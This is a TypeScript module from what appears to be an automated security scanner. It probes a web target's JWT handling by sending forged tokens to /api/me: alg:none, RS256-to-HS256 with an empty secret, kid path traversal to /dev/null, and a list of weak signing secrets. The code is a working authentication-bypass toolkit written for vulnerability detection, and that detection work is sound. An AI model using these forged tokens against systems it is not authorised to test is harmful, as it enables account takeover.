import axios from "axios";
import crypto from "crypto";
import logger from "../../utils/logger";

interface JWTVuln {
  technique: "alg_none" | "rs256_hs256_confusion" | "empty_secret" | "weak_secret" | "kid_injection";
  severity: "critical" | "high";
  detail: string;
}

interface JWTProbeResult {
  jwtFound: boolean;
  vulns: JWTVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; raw: JWTVuln }>;
}

const WEAK_SECRETS = ["secret", "password", "12345", "changeme", "jwt_secret", "supersecret"];
const JWT_PATTERN = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/;

function b64url(s: string): string {
  return Buffer.from(s).toString("base64").replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

function decodeB64url(s: string): string {
  const padded = s.replace(/-/g, "+").replace(/_/g, "/");
  const pad = padded.length % 4 === 0 ? 0 : 4 - (padded.length % 4);
  return Buffer.from(padded + "=".repeat(pad), "base64").toString("utf8");
}

function parseJWT(token: string): { header: Record<string, unknown>; payload: Record<string, unknown>; parts: string[] } | null {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const header = JSON.parse(decodeB64url(parts[0]));
    const payload = JSON.parse(decodeB64url(parts[1]));
    return { header, payload, parts };
  } catch {
    return null;
  }
}

function craftJWT(header: Record<string, unknown>, payload: Record<string, unknown>, signature: string): string {
  const h = b64url(JSON.stringify(header));
  const p = b64url(JSON.stringify(payload));
  return `${h}.${p}.${signature}`;
}

function signHS256(headerB64: string, payloadB64: string, secret: string): string {
  return crypto.createHmac("sha256", secret).update(`${headerB64}.${payloadB64}`).digest("base64url");
}

function hasUserData(data: unknown): boolean {
  if (!data || typeof data !== "object") return false;
  const obj = data as Record<string, unknown>;
  const userFields = ["id", "user", "username", "email", "name", "userId", "user_id", "profile"];
  return userFields.some((field) => field in obj);
}

function toHypothesis(
  vuln: JWTVuln
): { vulnClass: string; reasoning: string; confidence: number; priority: number; raw: JWTVuln } {
  return {
    vulnClass: "auth_bypass",
    reasoning: `JWT vulnerability via ${vuln.technique} — authentication token integrity can be bypassed`,
    confidence: vuln.severity === "critical" ? 0.85 : 0.7,
    priority: 10,
    // Full detection detail — HunterEngine attaches this to the hypothesis's
    // evidence so the PROBE phase can recognize this hypothesis was already
    // actively confirmed here (a real crafted JWT — alg:none, RS256→HS256
    // confusion, kid path injection, or a cracked weak secret — that the
    // server accepted) and skip re-dispatching it to nuclei's generic
    // "default-login,auth-bypass" templates, which have no way to replay a
    // specific forged token.
    raw: vuln,
  };
}

class JWTConfusionProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<JWTProbeResult> {
    const vulns: JWTVuln[] = [];
    const baseUrl = targetUrl.replace(/\/$/, "");
    const axiosOpts = { timeout: 5000, validateStatus: () => true };

    // Step 1 — detect JWT in use
    let existingToken: string | null = null;

    // Check authHeaders for Bearer JWT
    if (authHeaders) {
      for (const [key, value] of Object.entries(authHeaders)) {
        if (key.toLowerCase() === "authorization") {
          const match = value.match(/^Bearer\s+(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)/i);
          if (match) {
            existingToken = match[1];
            logger.debug(`[JWT] Found JWT in Authorization header`);
            break;
          }
        }
      }
    }

    // Check Set-Cookie on base URL response
    if (!existingToken) {
      try {
        const res = await axios.get(baseUrl, { ...axiosOpts, headers: authHeaders ?? {} });
        const setCookie = res.headers["set-cookie"];
        if (setCookie) {
          const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
          for (const cookie of cookies) {
            const match = cookie.match(JWT_PATTERN);
            if (match) {
              existingToken = match[0];
              logger.debug(`[JWT] Found JWT in Set-Cookie on base URL`);
              break;
            }
          }
        }
      } catch (err) {
        logger.debug(`[JWT] Error fetching base URL: ${err}`);
      }
    }

    // Try GET /api/me to find JWT
    if (!existingToken) {
      try {
        const res = await axios.get(`${baseUrl}/api/me`, {
          ...axiosOpts,
          headers: authHeaders ?? {},
        });
        const setCookie = res.headers["set-cookie"];
        if (setCookie) {
          const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
          for (const cookie of cookies) {
            const match = cookie.match(JWT_PATTERN);
            if (match) {
              existingToken = match[0];
              logger.debug(`[JWT] Found JWT in Set-Cookie on /api/me`);
              break;
            }
          }
        }
      } catch (err) {
        logger.debug(`[JWT] Error fetching /api/me: ${err}`);
      }
    }

    if (!existingToken) {
      logger.debug(`[JWT] No JWT found, skipping probe`);
      return { jwtFound: false, vulns: [], hypotheses: [] };
    }

    const parsed = parseJWT(existingToken);
    if (!parsed) {
      logger.debug(`[JWT] Could not parse JWT`);
      return { jwtFound: true, vulns: [], hypotheses: [] };
    }

    const { header, payload } = parsed;
    const meUrl = `${baseUrl}/api/me`;

    // Step 2 — craft attack JWTs

    // 1. alg:none
    try {
      const noneHeader = { ...header, alg: "none" };
      const noneToken = craftJWT(noneHeader, payload, "");
      const res = await axios.get(meUrl, {
        ...axiosOpts,
        headers: { ...(authHeaders ?? {}), Authorization: `Bearer ${noneToken}` },
      });
      if (res.status === 200 && hasUserData(res.data)) {
        vulns.push({
          technique: "alg_none",
          severity: "critical",
          detail: `Server accepted JWT with alg:none — signature validation bypassed (status ${res.status})`,
        });
        logger.warn(`[JWT] alg_none vuln confirmed`);
      }
    } catch (err) {
      logger.debug(`[JWT] alg_none test error: ${err}`);
    }

    // 2. Empty secret HS256 (triggered if original uses RS256)
    if (typeof header.alg === "string" && header.alg.toUpperCase() === "RS256") {
      try {
        const hs256Header = { ...header, alg: "HS256" };
        const hB64 = b64url(JSON.stringify(hs256Header));
        const pB64 = b64url(JSON.stringify(payload));
        const sig = signHS256(hB64, pB64, "");
        const emptySecretToken = `${hB64}.${pB64}.${sig}`;
        const res = await axios.get(meUrl, {
          ...axiosOpts,
          headers: { ...(authHeaders ?? {}), Authorization: `Bearer ${emptySecretToken}` },
        });
        if (res.status === 200 && hasUserData(res.data)) {
          vulns.push({
            technique: "empty_secret",
            severity: "critical",
            detail: `Server accepted RS256 JWT re-signed as HS256 with empty secret (status ${res.status})`,
          });
          logger.warn(`[JWT] empty_secret (RS256→HS256) vuln confirmed`);
        }
      } catch (err) {
        logger.debug(`[JWT] empty_secret test error: ${err}`);
      }
    }

    // 3. kid path injection
    if ("kid" in header) {
      const kidPayloads = ["../../../../dev/null", "/dev/null"];
      for (const kidVal of kidPayloads) {
        try {
          const kidHeader = { ...header, kid: kidVal };
          // Sign with empty secret — if kid is used to fetch key, /dev/null gives empty key
          const hB64 = b64url(JSON.stringify(kidHeader));
          const pB64 = b64url(JSON.stringify(payload));
          const sig = signHS256(hB64, pB64, "");
          const kidToken = `${hB64}.${pB64}.${sig}`;
          const res = await axios.get(meUrl, {
            ...axiosOpts,
            headers: { ...(authHeaders ?? {}), Authorization: `Bearer ${kidToken}` },
          });
          if (res.status === 200 && hasUserData(res.data)) {
            vulns.push({
              technique: "kid_injection",
              severity: "critical",
              detail: `Server accepted JWT with kid path traversal "${kidVal}" (status ${res.status})`,
            });
            logger.warn(`[JWT] kid_injection vuln confirmed with kid: ${kidVal}`);
            break;
          }
        } catch (err) {
          logger.debug(`[JWT] kid_injection test error (kid=${kidVal}): ${err}`);
        }
      }
    }

    // 4. Weak secrets
    const algStr = typeof header.alg === "string" ? header.alg.toUpperCase() : "";
    if (algStr === "HS256" || algStr === "HS384" || algStr === "HS512" || algStr === "RS256") {
      for (const secret of WEAK_SECRETS) {
        try {
          const weakHeader = { ...header, alg: "HS256" };
          const hB64 = b64url(JSON.stringify(weakHeader));
          const pB64 = b64url(JSON.stringify(payload));
          const sig = signHS256(hB64, pB64, secret);
          const weakToken = `${hB64}.${pB64}.${sig}`;
          const res = await axios.get(meUrl, {
            ...axiosOpts,
            headers: { ...(authHeaders ?? {}), Authorization: `Bearer ${weakToken}` },
          });
          if (res.status === 200 && hasUserData(res.data)) {
            vulns.push({
              technique: "weak_secret",
              severity: "high",
              detail: `Server accepted JWT signed with weak secret "${secret}" (status ${res.status})`,
            });
            // The cracked secret is retained in the structured finding (detail above)
            // for the report, but kept out of app logs to avoid secret sprawl.
            logger.warn(`[JWT] weak_secret vuln confirmed (secret length ${secret.length})`);
            break;
          }
        } catch (err) {
          logger.debug(`[JWT] weak_secret test error (secret length ${secret.length}): ${err}`);
        }
      }
    }

    const hypotheses = vulns.map((v) => toHypothesis(v));

    return { jwtFound: true, vulns, hypotheses };
  }
}

export const jwtConfusionProber = new JWTConfusionProber();
